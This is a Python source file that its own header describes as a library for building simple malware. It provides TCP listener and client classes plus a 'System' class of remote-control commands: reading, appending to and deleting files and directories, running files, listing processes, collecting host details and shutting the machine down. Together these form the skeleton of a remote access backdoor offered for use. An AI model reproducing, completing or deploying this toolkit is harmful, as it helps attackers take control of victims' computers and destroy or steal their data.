#A library of preferences for building simple and functional malware in a very simple way
#rubika channel : @wroftqn
import socket
import psutil
import os
import time
import platform
class TCP:
    def __init__(self,ip,port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.a = ip
        self.port = port
        self.sock.bind((self.a, self.port))
        # self.conn = None
    def __repr__(self):
        return f'{self.a}:{self.port}'
    def listen(self,number=5):
        self.sock.listen(number)
    def accept(self,conn="conn",addr="addr"):
        self.conn, self.addr = self.sock.accept()
        return self.addr
    def recive(self,buffer_size=4096):
        self.data = self.conn.recv(buffer_size)
        return self.data
    def send(self,data):
        termin = data + b"<END>"
        self.conn.sendall(termin)
    def close(self):
        self.sock.close()
        self.conn.close()
class connectTCP:
    def __init__(self,ip,port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.sock.connect((self.ip,self.port))
    def __repr__(self):
        return f"{self.ip}:{self.port}"
    def sendTCP(self,data):
        self.sock.sendall(data)
    def recvTCP(self,buffersize=4096):
        # self.data = self.sock.recv(buffersize)
        # return self.data
        received_data = b""
        while True:
            chunk = self.sock.recv(buffersize)
            if not chunk:
                break
            received_data += chunk
            if received_data.endswith(b"<END>"):
                received_data = received_data[:-5]
                break
        return received_data
    def close(self):
        self.sock.close()
def speak(speak):
    try:
        import pyttsx3
        pyttsx3.speak(speak)
    except ModuleNotFoundError:
        import os
        os.system("pip install pyttsx3")
class System:
    @property
    def ls(self):
        try:
            return "\n".join(os.listdir())
        except Exception as e:
            return e
    @property
    def pwd(self):
        try:
            return os.getcwd()
        except Exception as e:
            return e
    def mkdir(self,mk):
        try:
            os.mkdir(mk)
        except Exception as e:
            return f"Erorr :{e}"

    def cat(self,file):
        try:
            with open(file,'r') as e:
                return e.read()
        except Exception as e:
            return f"Erorr :{e}"
    def rm(self,file):
        try:
            os.remove(file)
        except PermissionError as e:
            return f"Erorr :{e}"
        except Exception as e:
            return f"Erorr :{e}"
    def rmdir(self,file):
        try:
            os.rmdir(file)
        except PermissionError as e:
            return f"Erorr :{e}"
        except Exception as e:
            return f"Erorr :{e}"
    @property
    def shutdown(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1")
            else:
                os.system("shutdown now")
        except Exception as e:
            return f"Erorr :{e}"
    def cd(self,dir):
        try:
            os.chdir(dir)
            return os.getcwd()
        except Exception as e:
            return f"Erorr :{e}"
    def run(self,file):
        try:
            os.startfile(file)
        except Exception as e:
            return f"Erorr :{e}"
    @property
    def info(self):
        try:
            time.sleep(0.5)
            return f"""
-----------------------------------------------
{platform.system()} 
{platform.release()} 
{platform.version()} 
{platform.machine()} 
{platform.processor()}
{platform.python_version()}
{platform.python_implementation()}
{platform.platform()}
{platform.uname()}
------------------------------------------------"""
        except Exception as e:
            return f"Erorr :{e}"
    def file(self,f,text=''):
        try:
            with open(f,"a") as e:
                e.write(text)
                e.close()
        except Exception as e:
            return f"Erorr :{e}"
    @property
    def ps(self):
        try:
            result = ''
            for i in psutil.process_iter(['name','pid']):
                result += f"{i.name()} ----> pid : {i.pid}\n"
            return result
        except Exception as e:
            return f"Erorr :{e}"
class all(TCP,System):
    pass